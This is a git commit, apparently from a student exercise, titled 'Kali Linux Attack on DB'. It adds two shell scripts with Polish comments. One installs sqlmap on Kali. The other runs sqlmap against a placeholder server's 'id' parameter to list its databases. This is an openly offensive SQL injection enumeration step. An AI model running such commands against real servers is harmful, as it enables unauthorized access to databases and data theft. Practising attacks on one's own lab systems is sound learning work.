8e2b9feea34f10bae75292d34c38e5087317b7c0
Kamilq99 <thealti222@gmail.com>
2024-06-10 18:15:30 +0200

    Kali Linux Attack on DB

---
+++ 1.check_extension_on_kali.sh
@@ -0,0 +1,8 @@
+#wpisz poniższą nazwę toolkita
+sqlmap
+#Update
+sudo apt update
+#Upgrade
+sudo apt upgrade
+#Jeśli nie masz to zainstaluj go
+sudo apt install sqlmap
---
+++ 3.getdatabasetable.sh
@@ -0,0 +1,1 @@
+sqlmap -u "http://<IP_SERWERA>/index.php?id=1" --dbs
